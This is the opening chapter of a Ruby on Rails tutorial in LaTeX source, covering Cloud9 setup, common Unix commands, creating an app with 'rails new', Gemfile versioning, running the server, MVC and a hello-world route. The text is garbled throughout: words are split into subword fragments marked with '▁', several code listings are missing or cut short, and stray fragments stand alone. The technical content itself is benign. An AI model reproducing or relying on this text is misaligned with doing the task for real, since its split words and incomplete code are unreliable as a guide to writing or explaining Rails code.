▁After ▁C loud 9 ▁has ▁finished ▁pro v is ion ing ▁the ▁ workspace , ▁select ▁it ▁and ▁click ▁`` S t ar t ▁editing ''
▁Because ▁using ▁two ▁spaces ▁for ▁indentation ▁is ▁a ▁ n e ar - universal ▁convention ▁in ▁Ruby , ▁I ▁also ▁recommend ▁changing ▁the ▁editor ▁to ▁use ▁two ▁spaces ▁instead ▁of ▁the ▁default ▁four .
▁As ▁show n ▁in ▁F igure ~\ ref { fig : cloud 9 _ two _ space s }, ▁you ▁can ▁do ▁this ▁by ▁click ing ▁the ▁gear ▁icon ▁in ▁the ▁upper ▁right ▁and ▁the n ▁select ing ▁`` C ode ▁ Edit or ▁( A ce ) '' ▁to ▁edit ▁the ▁`` S of t ▁T abs '' ▁setting .
▁( Note ▁that ▁this ▁take s ▁effect ▁immediately ; ▁you ▁don ' t ▁need ▁to ▁click ▁a ▁`` S a ve '' ▁button .)
▁Creat ing ▁a ▁new ▁ workspace ▁at ▁C loud 9 .
▁Setting ▁C loud 9 ▁to ▁use ▁two ▁spaces ▁for ▁indentation .
▁At ▁present , ▁C loud 9 ▁includes ▁an ▁older ▁version ▁of ▁Rails ▁that ▁is ▁in com p at i b le ▁with ▁the ▁present ▁tutorial , ▁which ▁is ▁one ▁reason ▁why ▁it ' s ▁so ▁important ▁to ▁install ▁it ▁our s el ve s .
▁( If ▁developing ▁on ▁your ▁local ▁system , ▁this ▁means ▁using ▁a ▁regular ▁terminal ▁window ; ▁if ▁using ▁the ▁cloud ▁IDE , ▁this ▁means ▁using ▁the ▁command - line ▁are a ▁show n ▁in ▁F igure ~\ ref { fig : id e _ an a to my }. )
▁ Installing ▁Rails ▁with ▁a ▁specific ▁version ▁number .
▁string
▁Vi r t u ally ▁all ▁Rails ▁applications ▁start ▁the ▁same ▁way , ▁by ▁running ▁the ▁\ k ode { rails ▁new } ▁command .
▁This ▁hand y ▁command ▁creates ▁a ▁ s k e leton ▁Rails ▁application ▁in ▁a ▁directory ▁of ▁your ▁choice .
▁To ▁get ▁started , ▁users ▁\ emph { not } ▁using ▁the ▁C loud 9 ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁should ▁make ▁a ▁\ k ode { workspace } ▁directory ▁for ▁your ▁Rails ▁project s ▁if ▁it ▁does n ' t ▁already ▁exist ▁( Listing ~\ ref { code : mkdir _ rails _ projects }) ▁and ▁the n ▁change ▁into ▁the ▁directory .
▁Mak ing ▁a ▁\ k ode { workspace } ▁directory ▁for ▁Rails ▁project s ▁( un n ec es s ary ▁in ▁the ▁cloud ).
▁ $ ▁ mkdir ▁ workspace
▁ $ ▁ cd ▁ workspace /
▁A ▁c ra s h ▁course ▁on ▁the ▁Unix ▁command ▁line
▁For ▁readers ▁com ing ▁from ▁Windows ▁or ▁( to ▁a ▁less er ▁but ▁ still ▁significant ▁ ext ent ) ▁Mac in to s h ▁OS ~ X , ▁the ▁Unix ▁command ▁line ▁may ▁be ▁un familiar .
▁L uckily , ▁if ▁you ▁are ▁using ▁the ▁recommended ▁cloud ▁environment , ▁you ▁automatically ▁have ▁access ▁to ▁a ▁Unix ▁( L in u x ) ▁command ▁line ▁running ▁a ▁standard ▁\ href { http :// en . wiki p edia . org / wiki / S hel l _ ( com put ing )} { s hel l ▁command - line ▁interface } ▁known ▁as ▁\ href { http :// en . wiki p edia . org / wiki / B as h _ ( U n i x _ s hel l )} { B as h }.
▁The ▁basic ▁idea ▁of ▁the ▁command ▁line ▁is ▁simple : ▁by ▁is s u ing ▁short ▁commands , ▁users ▁can ▁perform ▁a ▁large ▁number ▁of ▁operations , ▁such ▁as ▁creating ▁directories ▁(\ text tt { mkdir }), ▁mov ing ▁and ▁copy ing ▁files ▁(\ text tt { m v } ▁and ▁\ text tt { c p }), ▁and ▁navigat ing ▁the ▁file system ▁by ▁changing ▁directories ▁(\ text tt { cd }).
▁A lthough ▁the ▁command ▁line ▁may ▁seem ▁p r i m i tive ▁to ▁users ▁main ly ▁ familiar ▁with ▁gra ph ical ▁user ▁interface s ▁( G U I s ), ▁appearance s ▁are ▁d eceiving : ▁the ▁command ▁line ▁is ▁one ▁of ▁the ▁most ▁powerful ▁tool s ▁in ▁the ▁developer ' s ▁tool box .
▁Inde ed , ▁you ▁will ▁rare ly ▁see ▁the ▁d es k to p ▁of ▁an ▁experience d ▁developer ▁without ▁sever al ▁open ▁terminal ▁window s ▁running ▁command - line ▁ s hel l s .
▁The ▁general ▁subject ▁is ▁ deep , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁tutorial ▁we ▁will ▁need ▁only ▁a ▁few ▁of ▁the ▁most ▁common ▁Unix ▁command - line ▁commands , ▁as ▁summariz ed ▁in ▁Table ~\ ref { table : un i x _ command s }.
▁For ▁a ▁more ▁in - de p th ▁treat ment ▁of ▁the ▁Unix ▁command ▁line , ▁see ▁\ href { http :// c onquering the command line . com / }{\ emph { C onquering ▁the ▁Co m m and ▁L ine } } ▁by ▁M ar k ▁B ate s ▁( available ▁as ▁a ▁\ href { http :// c onquering the command line . com / book }{ free ▁online ▁version } ▁and ▁as ▁\ href { http :// c onquering the command line . com / # p r ic ing }{ e books ▁and ▁screencasts }).
▁list ▁contents
▁ $ ▁ l s ▁- l
▁make ▁directory
▁ mkdir ▁< d ir name >
▁change ▁directory
▁ cd ▁< d ir name >
▁ cd ▁one ▁directory ▁up
▁ $ ▁ cd ▁ . .
▁ cd ▁to ▁home ▁directory
▁move ▁file ▁( re name )
▁m v ▁< source > ▁< target >
▁ $ ▁m v ▁README . rdoc ▁README . m d
▁copy ▁file
▁c p ▁< source > ▁< target >
▁ $ ▁c p ▁README . rdoc ▁README . m d
▁remove ▁file
▁ rm ▁< file >
▁ $ ▁ rm ▁README . rdoc
▁remove ▁empty ▁directory
▁ rm d ir ▁< directory >
▁ $ ▁ rm d ir ▁ workspace /
▁remove ▁non empty ▁directory
▁ rm ▁- r f ▁< directory >
▁ $ ▁ rm ▁- r f ▁t mp /
▁ cat ▁< file >
▁Some ▁common ▁Unix ▁commands .
▁The ▁next ▁step ▁on ▁both ▁local ▁systems ▁and ▁the ▁cloud ▁IDE ▁is ▁to ▁create ▁the ▁first ▁application ▁using ▁the ▁command ▁in ▁Listing ~\ ref { code : rails _ command }.
▁This ▁ensure s ▁that ▁the ▁same ▁version ▁of ▁Rails ▁we ▁installed ▁in ▁Listing ~\ ref { code : install ing _ rails } ▁is ▁used ▁to ▁create ▁the ▁first ▁application ' s ▁file ▁structure .
▁( If ▁the ▁command ▁in ▁Listing ~\ ref { code : rails _ command } ▁returns ▁an ▁error ▁like ▁`` Co ul d ▁not ▁find ▁' ra il t ies ' '' , ▁it ▁means ▁you ▁don ' t ▁have ▁the ▁right ▁version ▁of ▁Rails ▁installed , ▁and ▁you ▁should ▁double - check ▁that ▁you ▁followed ▁the ▁command ▁in ▁Listing ~\ ref { code : install ing _ rails } ▁exactly ▁as ▁written .)
▁Running ▁\ k ode { rails ▁new } ▁( with ▁a ▁specific ▁version ▁number ).
▁create ▁README . rdoc
▁create ▁Rake file
▁create ▁config . ru
▁create ▁ . gitignore
▁create ▁Gemfile
▁create ▁app
▁create ▁app / assets / javascripts / application . js
▁create ▁app / assets / stylesheets / application . css
▁create ▁app / controllers / application _ controller . rb
▁< n > ▁ .
▁run ▁bundle ▁install
▁Your ▁bundle ▁is ▁complete !
▁Use ▁` bundle ▁show ▁[ gem name ]` ▁to ▁see ▁where ▁a ▁bundle d ▁gem ▁is ▁installed .
▁As ▁seen ▁at ▁the ▁end ▁of ▁Listing ~\ ref { code : rails _ command }, ▁running ▁\ k ode { rails ▁new } ▁automatically ▁run s ▁the ▁\ k ode { bundle ▁install } ▁command ▁after ▁the ▁file ▁creation ▁is ▁done .
▁We ' ll ▁discuss ▁what ▁this ▁means ▁in ▁more ▁detail ▁starting ▁in ▁Section ~\ ref { sec : bundle r }.
▁Noti ce ▁how ▁many ▁files ▁and ▁directories ▁the ▁\ k ode { rails } ▁command ▁creates .
▁This ▁standard ▁directory ▁and ▁file ▁structure ▁( F igure ~\ ref { fig : directory _ structure _ rails }) ▁is ▁one ▁of ▁the ▁many ▁advantage s ▁of ▁Rails ; ▁it ▁immediately ▁get s ▁you ▁from ▁ zero ▁to ▁a ▁functional ▁( if ▁minimal ) ▁application .
▁More over , ▁since ▁the ▁structure ▁is ▁common ▁to ▁all ▁Rails ▁app s , ▁you ▁can ▁immediately ▁get ▁your ▁be ar ing s ▁when ▁look ing ▁at ▁some one ▁else ' s ▁code .
▁A ▁summary ▁of ▁the ▁default ▁Rails ▁files ▁appears ▁in ▁Table ~\ ref { table : rails _ directory _ structure } ; ▁we ' ll ▁learn ▁about ▁most ▁of ▁these ▁files ▁and ▁directories ▁throughout ▁the ▁rest ▁of ▁this ▁book .
▁In ▁particular , ▁starting ▁in ▁Section ~\ ref { sec : the _ asset _ pipeline } ▁we ' ll ▁discuss ▁the ▁\ k ode { app / assets } ▁directory , ▁part ▁of ▁the ▁\ emph { asset ▁pipeline } ▁that ▁make s ▁it ▁easier ▁than ▁ever ▁to ▁ org an ize ▁and ▁deploy ▁assets ▁such ▁as ▁cascad ing ▁style ▁ sheet s ▁and ▁JavaScript ▁files .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app .
▁Co re ▁application ▁( app ) ▁code , ▁including ▁models , ▁views , ▁controllers , ▁and ▁helpers
▁Application s ▁assets ▁such ▁as ▁cascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁B in ary ▁executable ▁files
▁Application ▁configuration
▁Database ▁files
▁ doc /
▁Documentation ▁for ▁the ▁application
▁ Library ▁module s
▁ Library ▁assets ▁such ▁as ▁cascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁Application ▁log ▁files
▁ Data ▁accessible ▁to ▁the ▁public ▁( e . g . , ▁via ▁web ▁browsers ), ▁such ▁as ▁error ▁pages
▁A ▁program ▁for ▁ generating ▁code , ▁open ing ▁console ▁sessions , ▁or ▁starting ▁a ▁local ▁server
▁Application ▁tests
▁T e mp or ary ▁files
▁T h ir d - part y ▁code ▁such ▁as ▁plugin s ▁and ▁gems
▁T h ir d - part y ▁assets ▁such ▁as ▁cascad ing ▁style ▁ sheet s ▁( CSS ), ▁JavaScript ▁files , ▁and ▁images
▁A ▁brief ▁description ▁of ▁the ▁application
▁U til ity ▁task s ▁available ▁via ▁the ▁\ k ode { rake } ▁command
▁G em ▁requirements ▁for ▁this ▁app
▁A ▁list ▁of ▁gems ▁used ▁to ▁ensure ▁that ▁all ▁copie s ▁of ▁the ▁app ▁use ▁the ▁same ▁gem ▁versions
▁A ▁configuration ▁file ▁for ▁\ href { http :// rack . github . io /}{ Rack ▁middleware }
▁ Pattern s ▁for ▁files ▁that ▁should ▁be ▁ignored ▁by ▁Git
▁A ▁summary ▁of ▁the ▁default ▁Rails ▁directory ▁structure .
▁After ▁creating ▁a ▁new ▁Rails ▁application , ▁the ▁next ▁step ▁is ▁to ▁use ▁\ emph { B un d ler } ▁to ▁install ▁and ▁include ▁the ▁gems ▁needed ▁by ▁the ▁app .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : the _ hello _ application }, ▁Bundler ▁is ▁run ▁automatically ▁( via ▁\ k ode { bundle ▁install }) ▁by ▁the ▁\ k ode { rails } ▁command , ▁but ▁in ▁this ▁section ▁we ' ll ▁make ▁some ▁changes ▁to ▁the ▁default ▁application ▁gems ▁and ▁run ▁Bundler ▁again .
▁( With ▁the ▁cloud ▁IDE , ▁this ▁involve s ▁click ing ▁the ▁a r row ▁in ▁the ▁file ▁navigat or ▁to ▁open ▁the ▁sample ▁app ▁directory ▁and ▁double - click ing ▁the ▁\ k ode { Gemfile } ▁icon .)
▁A lthough ▁the ▁exact ▁version ▁number s ▁and ▁details ▁may ▁differ ▁slightly , ▁the ▁results ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : cloud 9 _ gemfile } ▁and ▁Listing ~\ ref { code : default _ gemfile }.
▁( The ▁code ▁in ▁this ▁file ▁is ▁Ruby , ▁but ▁don ' t ▁worry ▁at ▁this ▁point ▁about ▁the ▁syntax ; ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁will ▁cover ▁Ruby ▁in ▁more ▁depth .)
▁If ▁the ▁files ▁and ▁directories ▁don ' t ▁appear ▁as ▁show n ▁in ▁F igure ~\ ref { fig : cloud 9 _ gemfile }, ▁click ▁on ▁the ▁file ▁navigat or ' s ▁gear ▁icon ▁and ▁select ▁`` Re f re s h ▁File ▁T re e ''.
▁( As ▁a ▁general ▁rule , ▁you ▁should ▁refresh ▁the ▁file ▁ tree ▁any ▁time ▁files ▁or ▁directories ▁don ' t ▁appear ▁as ▁expected .)
▁The ▁default ▁\ k ode { Gemfile } ▁open ▁in ▁a ▁text ▁editor .
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { hello \_ app } ▁directory .
▁# ▁B un d le ▁edge ▁Rails ▁instead :
▁# ▁Use ▁ sqlite 3 ▁as ▁the ▁database ▁for ▁Active ▁Record
▁# ▁Use ▁SCSS ▁for ▁stylesheets
▁# ▁Use ▁U g li fi er ▁as ▁ compressor ▁for ▁JavaScript ▁assets
▁# ▁Use ▁CoffeeScript ▁for ▁ . js . coffee ▁assets ▁and ▁views
▁# ▁See ▁ https :// github . com / s st e phens on / execjs # readme ▁for ▁more ▁supported ▁runtime s
▁# ▁gem ▁' the ruby r ac er ' , ▁platform s : ▁: ruby
▁# ▁Use ▁ jquery ▁as ▁the ▁JavaScript ▁library
▁# ▁ Turbolinks ▁make s ▁following ▁links ▁in ▁your ▁web ▁application ▁faster .
▁# ▁B u il d ▁JSON ▁API s ▁with ▁e as e .
▁Read ▁more : ▁ https :// github . com / rails / j builder
▁# ▁bundle ▁exec ▁rake ▁ doc : rails ▁generates ▁the ▁API ▁under ▁ doc / api .
▁# ▁Use ▁ ActiveModel ▁has _ secure _ password
▁# ▁gem ▁' unicorn '
▁# ▁Use ▁C api str an o ▁for ▁deployment
▁For ▁now , ▁we ▁won ' t ▁need ▁any ▁gems ▁other ▁than ▁the ▁defaults .
▁Un less ▁you ▁specify ▁a ▁version ▁number ▁to ▁the ▁\ k ode { gem } ▁command , ▁Bundler ▁will ▁automatically ▁install ▁the ▁latest ▁request ed ▁version ▁of ▁the ▁gem .
▁This ▁is ▁the ▁case , ▁for ▁example , ▁in ▁the ▁code
▁There ▁are ▁also ▁two ▁common ▁ways ▁to ▁specify ▁a ▁gem ▁version ▁range , ▁which ▁allows ▁us ▁to ▁ ex er t ▁some ▁control ▁over ▁the ▁version ▁used ▁by ▁Rails .
▁The ▁first ▁look s ▁like ▁this :
▁This ▁install s ▁the ▁latest ▁version ▁of ▁the ▁\ k ode { uglifier } ▁gem ▁( which ▁handle s ▁file ▁compression ▁for ▁the ▁asset ▁pipeline ) ▁as ▁long ▁as ▁it ' s ▁greater ▁than ▁or ▁equal ▁to ▁version ~\ k ode { 1 . 3 . 0 }--- even ▁if ▁it ' s , ▁say , ▁version ~\ k ode { 7 . 2 }.
▁The ▁second ▁method ▁look s ▁like ▁this :
▁This ▁install s ▁the ▁gem ▁\ k ode { coffee - rails } ▁as ▁long ▁as ▁it ' s ▁new er ▁than ▁version ~\ k ode { 4 . 0 . 0 } ▁and ▁\ emph { not } ▁new er ▁than ▁\ k ode { 4 . 1 }.
▁In ▁other ▁words ,
▁U nfortunately , ▁experience ▁shows ▁that ▁even ▁minor ▁point ▁release s ▁can ▁break ▁things , ▁so ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁we ' ll ▁ er r ▁on ▁the ▁side ▁of ▁caution ▁by ▁including ▁exact ▁version ▁number s ▁for ▁all ▁gems .
▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version }.
▁Note ▁that ▁we ' ve ▁also ▁take n ▁this ▁opportunit y ▁to ▁arrange ▁for ▁the ▁\ text tt { sqlite 3 } ▁gem ▁to ▁be ▁included ▁only ▁in ▁a ▁development ▁or ▁test ▁environment ▁( Section ~\ ref { sec : rails _ environments }), ▁which ▁prevent s ▁potential ▁conflicts ▁with ▁the ▁database ▁used ▁by ▁Heroku ▁( Section ~\ ref { sec : deploying }).
▁Gemfile
▁A ▁\ k ode { Gemfile } ▁with ▁an ▁explicit ▁version ▁for ▁each ▁Ruby ▁gem .
▁As ▁noted ▁in ▁Table ~\ ref { table : s h or t cut s }, ▁you ▁can ▁even ▁leave ▁off ▁\ k ode { install }, ▁as ▁the ▁\ k ode { bundle } ▁command ▁by ▁itself ▁is ▁an ▁alias ▁for ▁\ k ode { bundle ▁install }.
▁ $ ▁bundle ▁install
▁F et ch ing ▁source ▁index ▁for ▁ https :// rubygems . org /
▁The ▁\ k ode { bundle ▁install } ▁command ▁m ight ▁take ▁a ▁few ▁moment s , ▁but ▁when ▁it ' s ▁done ▁our ▁application ▁will ▁be ▁ready ▁to ▁run .
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ hello _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundle r }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁H appily , ▁Rails ▁comes ▁with ▁a ▁command - line ▁program , ▁or ▁\ emph { script }, ▁that ▁run s ▁a ▁\ emph { local } ▁web ▁server ▁to ▁assist ▁us ▁in ▁developing ▁our ▁application .
▁The ▁exact ▁command ▁depend s ▁on ▁the ▁environment ▁you ' re ▁using : ▁on ▁a ▁local ▁system , ▁you ▁just ▁run ▁\ k ode { rails ▁server } ▁( Listing ~\ ref { code : local _ server }), ▁whereas ▁on ▁C loud 9 ▁you ▁need ▁to ▁supply ▁an ▁ additional ▁\ emph { IP ▁bin d ing ▁address } ▁and ▁\ emph { \ href { http :// en . wiki p edia . org / wiki / T C P _ and _ U D P _ port }{ port ▁number } } ▁to ▁tell ▁the ▁Rails ▁server ▁the ▁address ▁it ▁can ▁use ▁to ▁make ▁the ▁application ▁visible ▁to ▁the ▁outside ▁world ▁( Listing ~\ ref { code : cloud _ server })
▁No rm ally , ▁website s ▁run ▁on ▁ port ▁80 , ▁but ▁this ▁usually ▁requires ▁special ▁privilege s , ▁so ▁it ' s ▁conventional ▁to ▁use ▁a ▁less ▁restrict ed ▁high er - number ed ▁ port ▁for ▁the ▁development ▁server .
▁If ▁your ▁system ▁complain s ▁about ▁the ▁ la c k ▁of ▁a ▁JavaScript ▁runtime , ▁visit ▁the ▁\ href { https :// github . com / s st e phens on / execjs }{ execjs ▁page ▁at ▁GitHub } ▁for ▁a ▁list ▁of ▁possibilities .
▁I ▁particular ly ▁recommend ▁install ing ▁\ href { http :// n ode js . org /}{ N ode . js }.
▁Running ▁the ▁Rails ▁server ▁on ▁a ▁local ▁machine .
▁ $ ▁ cd ▁ ~ / workspace /
▁=> ▁Bo o ting ▁WEBrick
▁=> ▁ Ctrl - C ▁to ▁ s h u td own ▁server
▁Running ▁the ▁Rails ▁server ▁on ▁the ▁cloud ▁IDE .
▁Whi ch ever ▁option ▁you ▁choose , ▁I ▁recommend ▁running ▁the ▁\ k ode { rails ▁server } ▁command ▁in ▁a ▁second ▁terminal ▁tab ▁so ▁that ▁you ▁can ▁ still ▁issue ▁commands ▁in ▁the ▁first ▁tab , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : new _ ter m in al _ t a b } ▁and ▁F igure ~\ ref { fig : rails _ server _ new _ t a b }.
▁( If ▁you ▁already ▁started ▁a ▁server ▁in ▁your ▁first ▁tab , ▁press ▁ Ctrl - C ▁to ▁ s h u t ▁it ▁down .)
▁On ▁a ▁local ▁server , ▁point ▁your ▁browser ▁at ▁the ▁address ▁\ href { http :// localhost :3000/ }{ http :// localhost :3000/ } ; ▁on ▁the ▁cloud ▁IDE , ▁go ▁to ▁S ha re ▁and ▁click ▁on ▁the ▁Application ▁address ▁to ▁open ▁it ▁( F igure ~\ ref { fig : s ha re _ workspace }).
▁In ▁either ▁case , ▁the ▁result ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : riding _ rails }.
▁Open ing ▁a ▁new ▁terminal ▁tab .
▁Running ▁the ▁Rails ▁server ▁in ▁a ▁separate ▁tab .
▁S h ar ing ▁the ▁local ▁server ▁running ▁on ▁the ▁cloud ▁ workspace .
▁The ▁default ▁Rails ▁page ▁served ▁by ▁\ k ode { rails ▁server }.
▁To ▁see ▁information ▁about ▁the ▁first ▁application , ▁click ▁on ▁the ▁link ▁`` About ▁your ▁application ' s ▁environment ''.
▁A lthough ▁exact ▁version ▁number s ▁may ▁differ , ▁the ▁result ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : riding _ rails _ environment }.
▁Of ▁course , ▁we ▁don ' t ▁need ▁the ▁default ▁Rails ▁page ▁in ▁the ▁long ▁run , ▁but ▁it ' s ▁nice ▁to ▁see ▁it ▁working ▁for ▁now .
▁We ' ll ▁remove ▁the ▁default ▁page ▁( and ▁replace ▁it ▁with ▁a ▁custom ▁home ▁page ) ▁in ▁Section ~\ ref { sec : hello _ world }.
▁The ▁default ▁page ▁with ▁the ▁application ' s ▁environment .
▁Even ▁at ▁this ▁ early ▁stage , ▁it ' s ▁helpful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁how ▁Rails ▁applications ▁work ▁( F igure ~\ ref { fig : MVC }).
▁You ▁m ight ▁have ▁notice d ▁that ▁the ▁standard ▁Rails ▁application ▁structure ▁( F igure ~\ ref { fig : directory _ structure _ rails }) ▁has ▁an ▁application ▁directory ▁called ▁\ k ode { app / } ▁with ▁three ▁subdirectories : ▁\ k ode { models }, ▁\ k ode { views }, ▁and ▁\ k ode { controllers }.
▁This ▁is ▁a ▁hint ▁that ▁Rails ▁follows ▁the ▁\ href { http :// en . wiki p edia . org / wiki / Model - view - controller }{ model - view - controller } ▁( MVC ) ▁architectur al ▁pattern , ▁which ▁enforce s ▁a ▁ se p ar ation ▁between ▁`` domain ▁logic '' ▁( also ▁called ▁`` business ▁logic '') ▁from ▁the ▁input ▁and ▁present ation ▁logic ▁ associated ▁with ▁a ▁gra ph ical ▁user ▁interface ▁( G U I ).
▁In ▁the ▁case ▁of ▁web ▁applications , ▁the ▁`` domain ▁logic '' ▁typical ly ▁consist s ▁of ▁data ▁models ▁for ▁things ▁like ▁users , ▁articles , ▁and ▁ products , ▁and ▁the ▁G U I ▁is ▁just ▁a ▁web ▁page ▁in ▁a ▁web ▁browser .
▁When ▁interact ing ▁with ▁a ▁Rails ▁application , ▁a ▁browser ▁send s ▁a ▁\ emph { request }, ▁which ▁is ▁receive d ▁by ▁a ▁web ▁server ▁and ▁passed ▁on ▁to ▁a ▁Rails ▁\ emph { controller }, ▁which ▁is ▁in ▁charge ▁of ▁what ▁to ▁do ▁next .
▁In ▁some ▁cases , ▁the ▁controller ▁will ▁immediately ▁render ▁a ▁\ emph { view }, ▁which ▁is ▁a ▁template ▁that ▁get s ▁convert ed ▁to ▁HTML ▁and ▁sent ▁back ▁to ▁the ▁browser .
▁More ▁commonly ▁for ▁dynamic ▁site s , ▁the ▁controller ▁interact s ▁with ▁a ▁\ emph { model }, ▁which ▁is ▁a ▁Ruby ▁object ▁that ▁represent s ▁an ▁element ▁of ▁the ▁site ▁( such ▁as ▁a ▁user ) ▁and ▁is ▁in ▁charge ▁of ▁communicat ing ▁with ▁the ▁database .
▁After ▁in v o k ing ▁the ▁model , ▁the ▁controller ▁the n ▁render s ▁the ▁view ▁and ▁returns ▁the ▁complete ▁web ▁page ▁to ▁the ▁browser ▁as ▁HTML .
▁A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture .
▁If ▁this ▁discussion ▁seem s ▁a ▁bit ▁abstract ▁right ▁now , ▁worry ▁not ; ▁we ' ll ▁refer ▁back ▁to ▁this ▁section ▁frequent ly .
▁Section ~\ ref { sec : hello _ world } ▁shows ▁a ▁first ▁t ent a tive ▁application ▁of ▁MVC , ▁while ▁Section ~\ ref { sec : mvc _ in _ action } ▁includes ▁a ▁more ▁ detailed ▁discussion ▁of ▁MVC ▁in ▁the ▁context ▁of ▁the ▁toy ▁app .
▁F inally , ▁the ▁sample ▁app ▁will ▁use ▁all ▁aspect s ▁of ▁MVC ; ▁we ' ll ▁cover ▁controllers ▁and ▁views ▁starting ▁in ▁Section ~\ ref { sec : static _ pages }, ▁models ▁starting ▁in ▁Section ~\ ref { sec : user _ model }, ▁and ▁we ' ll ▁see ▁all ▁three ▁working ▁together ▁in ▁Section ~\ ref { sec : a _ users _ resource }.
▁As ▁a ▁first ▁application ▁of ▁the ▁MVC ▁framework , ▁we ' ll ▁make ▁a ▁\ href { http :// en . wiki p edia . org / wiki / M r _ C re o so t e }{ w a f er - th in } ▁change ▁to ▁the ▁first ▁app ▁by ▁adding ▁a ▁\ emph { controller ▁action } ▁to ▁render ▁the ▁string ▁`` hello , ▁world ! ''.
▁( We ' ll ▁learn ▁more ▁about ▁controller ▁actions ▁starting ▁in ▁Section ~\ ref { sec : mvc _ in _ action }. )
▁The ▁result ▁will ▁be ▁to ▁replace ▁the ▁default ▁Rails ▁page ▁from ▁F igure ~\ ref { fig : riding _ rails } ▁with ▁the ▁`` hello , ▁world '' ▁page ▁that ▁is ▁the ▁goal ▁of ▁this ▁section .
▁As ▁implie d ▁by ▁their ▁name , ▁controller ▁actions ▁are ▁defined ▁inside ▁controllers .
▁We ' ll ▁call ▁our ▁action ▁\ k ode { hello } ▁and ▁place ▁it ▁in ▁the ▁Application ▁controller .
▁Inde ed , ▁at ▁this ▁point ▁the ▁Application ▁controller ▁is ▁the ▁only ▁controller ▁we ▁have , ▁which ▁you ▁can ▁verify ▁by ▁running
▁( We ' ll ▁start ▁creating ▁our ▁own ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }. )
▁Listing ~\ ref { code : hello _ action } ▁shows ▁the ▁result ing ▁definition ▁of ▁\ k ode { hello }, ▁which ▁uses ▁the ▁\ k ode { render } ▁function ▁to ▁return ▁the ▁text ▁`` hello , ▁world ! ''.
▁( Do n ' t ▁worry ▁about ▁the ▁Ruby ▁syntax ▁right ▁now ; ▁it ▁will ▁be ▁covered ▁in ▁more ▁depth ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }. )
▁ Adding ▁a ▁\ k ode { hello } ▁action ▁to ▁the ▁Application ▁controller .
▁# ▁For ▁API s , ▁you ▁may ▁want ▁to ▁use ▁: null _ session ▁instead .
▁protect _ from _ forgery
▁Having ▁defined ▁an ▁action ▁that ▁returns ▁the ▁desired ▁string , ▁we ▁need ▁to ▁tell ▁Rails ▁to ▁use ▁that ▁action ▁instead ▁of ▁the ▁default ▁page ▁in ▁F igure ~\ ref { fig : riding _ rails _ environment }.
▁To ▁do ▁this , ▁we ' ll ▁edit ▁the ▁Rails ▁\ emph { route r }, ▁which ▁ s it s ▁in ▁front ▁of ▁the ▁controller ▁in ▁F igure ~\ ref { fig : MVC } ▁and ▁determine s ▁where ▁to ▁send ▁requests ▁that ▁come ▁in ▁from ▁the ▁browser .
▁( I ' ve ▁omitted ▁the ▁route r ▁from ▁F igure ~\ ref { fig : MVC } ▁for ▁simplicity , ▁but ▁we ' ll ▁discuss ▁the ▁route r ▁in ▁more ▁detail ▁starting ▁in ▁Section ~\ ref { sec : mvc _ in _ action }. )
▁In ▁particular , ▁we ▁want ▁to ▁change ▁the ▁default ▁page , ▁the ▁\ emph { root ▁route }, ▁which ▁determine s ▁the ▁page ▁that ▁is ▁served ▁on ▁the ▁\ emph { root ▁URL }.
▁Because ▁it ' s ▁the ▁URL ▁for ▁an ▁address ▁like ▁ http :// www . example . com / ▁( where ▁nothing ▁comes ▁after ▁the ▁final ▁forward ▁ slash ), ▁the ▁root ▁URL ▁is ▁often ▁ referred ▁to ▁as ▁/ ▁( ` ` slash '') ▁for ▁short .
▁As ▁seen ▁in ▁Listing ~\ ref { code : default _ root _ route }, ▁the ▁Rails ▁routes ▁file ▁(\ k ode { config / routes . rb }) ▁includes ▁a ▁comment ed - out ▁line ▁that ▁shows ▁how ▁to ▁structure ▁the ▁root ▁route .
▁Here ▁`` welcome '' ▁is ▁the ▁controller ▁name ▁and ▁`` index '' ▁is ▁the ▁action ▁within ▁that ▁controller .
▁To ▁activate ▁the ▁root ▁route , ▁uncomment ▁this ▁line ▁by ▁remov ing ▁the ▁hash ▁character ▁and ▁the n ▁replace ▁it ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : hello _ root _ route }, ▁which ▁tell s ▁Rails ▁to ▁send ▁the ▁root ▁route ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁( As ▁noted ▁in ▁Section ~\ ref { sec : co n v ent ion s }, ▁vertical ▁do t s ▁indicate ▁omitted ▁code ▁and ▁should ▁not ▁be ▁copie d ▁literal ly .)
▁The ▁default ▁( comment ed - out ) ▁root ▁route .
▁# ▁You ▁can ▁have ▁the ▁root ▁of ▁your ▁site ▁route d ▁with ▁" root "
▁# ▁root ▁' welcome # index '
▁Setting ▁the ▁root ▁route .
▁With ▁the ▁code ▁from ▁Listing ~\ ref { code : hello _ action } ▁and ▁Listing ~\ ref { code : hello _ root _ route }, ▁the ▁root ▁route ▁returns ▁`` hello , ▁world ! ''
▁ hello _ world
